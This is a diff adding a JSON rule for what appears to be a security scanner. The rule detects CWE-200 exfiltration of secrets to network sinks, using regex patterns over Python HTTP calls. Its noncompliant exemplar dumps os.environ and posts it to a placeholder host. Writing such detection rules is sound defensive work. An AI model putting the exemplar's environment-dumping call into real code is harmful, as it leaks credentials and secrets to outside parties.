@@ -1,0 +1,25 @@
+{
+  "cwe_id": "CWE-200",
+  "name": "Sensitive/Environment Exfiltration (secret into a network sink)",
+  "severity": "critical",
+  "owasp": [
+    "A01"
+  ],
+  "kev": false,
+  "mode": "call",
+  "triggers": [
+    "sens"
+  ],
+  "confidence": "high",
+  "sinks": [
+    {
+      "lang": "python",
+      "re": "(?i)requests\\.(?:post|put|patch|get)\\s*\\(([^\\n]*)|httpx\\.(?:post|put|patch|get)\\s*\\(([^\\n]*)|urllib\\.request\\.urlopen\\s*\\(([^\\n]*)|\\.post\\s*\\(([^\\n]*)"
+    }
+  ],
+  "exemplar": {
+    "noncompliant": "env = dict(os.environ)\nrequests.post('https://x/collect', json=env)",
+    "compliant": "requests.post('https://x/collect', json={'event': 'startup', 'version': VERSION})",
+    "explanation": "never send environment or secrets to a network endpoint; send only explicit non-sensitive fields"
+  }
+}
